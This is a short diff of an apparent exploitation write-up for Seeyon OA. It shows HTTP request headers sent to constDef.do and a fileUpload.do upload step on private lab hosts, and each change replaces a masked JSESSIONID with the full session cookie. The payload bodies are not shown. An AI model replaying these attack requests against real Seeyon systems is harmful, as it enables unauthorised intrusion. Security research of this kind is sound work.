@@ -115,7 +115,7 @@ POST /seeyon/constDef.do HTTP/1.1
 Host: 172.16.135.220:8089
 accept: */*
 Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F******************************0; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
@@ -137,7 +137,7 @@ POST /seeyon/constDef.do HTTP/1.1
 Host: 172.16.135.220:8089
 accept: */*
 Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F******************************0; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
@@ -159,7 +159,7 @@ POST /seeyon/constDef.do HTTP/1.1
 Host: 172.16.135.220:8089
 accept: */*
 Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F******************************0; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
@@ -185,7 +185,7 @@ _**> Step1：**_
 ```http
 POST /seeyon/fileUpload.do?method=processUpload&maxSize= HTTP/1.1
 Host: 172.16.135.236:8089
-Cookie: JSESSIONID=0******************************6
+Cookie: JSESSIONID=0D3102C6
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: multipart/form-data; boundary=---------------------------1416682316313
@@ -242,7 +242,7 @@ Host: 172.16.135.220:8089
 accept: */*
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
 Accept-Encoding: gzip, deflate
-Cookie: JSESSIONID=F******************************0; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
+Cookie: JSESSIONID=F72080DF26DFA10AF113DF1F6BC38530; hostname=172.16.135.220:8089; login_locale=zh_CN; loginPageURL=
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 545
